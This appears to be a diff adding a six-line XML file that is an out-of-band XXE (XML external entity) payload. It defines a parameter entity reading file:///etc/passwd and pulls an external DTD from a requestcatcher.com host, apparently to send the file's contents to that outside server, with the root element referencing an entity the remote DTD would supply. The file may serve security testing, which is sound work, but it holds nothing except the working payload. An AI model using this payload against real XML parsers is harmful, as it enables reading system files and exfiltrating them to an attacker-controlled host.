@@ -1,0 +1,6 @@
+<!DOCTYPE root [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % dtd SYSTEM "https://xxetestkne.requestcatcher.com/external.dtd">
+  %dtd;
+]>
+<root>&xxe;</root>
